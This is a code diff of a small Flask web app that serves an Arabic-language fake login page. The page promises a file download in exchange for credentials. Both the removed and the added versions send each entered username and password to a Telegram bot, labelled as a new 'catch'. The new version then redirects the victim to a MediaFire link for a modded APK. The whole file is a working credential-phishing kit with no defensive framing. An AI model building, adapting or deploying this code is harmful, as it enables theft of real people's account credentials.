@@ -1,82 +1,78 @@
 import os
 import requests
-from flask import Flask, redirect, render_template_string, request, url_for
+from flask import Flask, jsonify, render_template_string, request
 
 app = Flask(__name__)
 
-BOT_TOKEN = os.getenv('BOT_TOKEN')
-ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '')
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
+def send_to_telegram(message):
+    if not BOT_TOKEN or not CHAT_ID:
+        return False
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
+    try:
+        response = requests.post(url, json=payload)
+        return response.json().get("ok", False)
+    except:
+        return False
 
-@app.route('/', methods=['GET', 'POST'])
-def login():
-  if request.method == 'POST':
-    username = request.form.get('username')
-    password = request.form.get('password')
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
+        body { background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; }
+        .login-container { background: #fff; width: 100%; height: 100vh; padding: 40px 20px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        @media (min-width: 768px) { .login-container { height: auto; max-width: 450px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 40px; } }
+        h2 { margin-bottom: 30px; color: #333; }
+        .form-group { width: 100%; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
+        button { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>تسجيل الدخول للمتابعة</h2>
+        <form onsubmit="sendData(event)">
+            <div class="form-group"><input type="text" id="username" placeholder="اسم المستخدم أو البريد" required></div>
+            <div class="form-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+            <button type="submit">دخول وتحميل الملف</button>
+        </form>
+    </div>
+    <script>
+        function sendData(event) {
+            event.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: u, password: p })
+            }).then(() => {
+                window.location.href = 'https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file';
+            });
+        }
+    </script>
+</body>
+</html>
+"""
 
-    if BOT_TOKEN and ADMIN_CHAT_ID:
-      text = (
-          f'🚨 تم صيد معلومات جديدة!\n👤 المدخل: {username}\n🔑'
-          f' الباسورد: {password}'
-      )
-      url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-      requests.post(url, json={'chat_id': ADMIN_CHAT_ID, 'text': text})
+@app.route("/")
+def home():
+    return render_template_string(HTML_TEMPLATE)
 
-    return redirect(url_for('download_page'))
+@app.route("/submit", methods=["POST"])
+def submit():
+    d = request.json
+    msg = f"🚨 <b>بيانات جديدة:</b>\n👤 <b>المستخدم:</b> {d.get('username')}\n🔑 <b>الباسورد:</b> {d.get('password')}"
+    send_to_telegram(msg)
+    return jsonify({"status": "success"})
 
-  return '''
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-        <meta charset="UTF-8">
-        <title>تسجيل الدخول - التحميل</title>
-        <style>
-            body { font-family: Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
-            input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-            button { background: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }
-            button:hover { background: #165fe5; }
-        </style>
-    </head>
-    <body>
-        <div class="login-box">
-            <h2>تسجيل الدخول للمتابعة</h2>
-            <form method="POST">
-                <input type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
-                <input type="password" name="password" placeholder="كلمة المرور" required>
-                <button type="submit">دخول وتحميل الملف</button>
-            </form>
-        </div>
-    </body>
-    </html>
-    '''
-
-
-@app.route('/download')
-def download_page():
-  return '''
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-        <meta charset="UTF-8">
-        <title>صفحة التنزيل</title>
-        <style>
-            body { font-family: Tahoma, sans-serif; background-color: #e8f5e9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-            .box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-            .btn { background: #4caf50; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px; }
-        </style>
-    </head>
-    <body>
-        <div class="box">
-            <h2>شكراً لك! تم التحقق بنجاح.</h2>
-            <p>يمكنك الآن تنزيل الملف الخاص بك مباشرة:</p>
-            <a href="#" class="btn">تحميل الملف الآن</a>
-        </div>
-    </body>
-    </html>
-    '''
-
-
-if __name__ == '__main__':
-  port = int(os.environ.get('PORT', 5000))
-  app.run(host='0.0.0.0', port=port)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
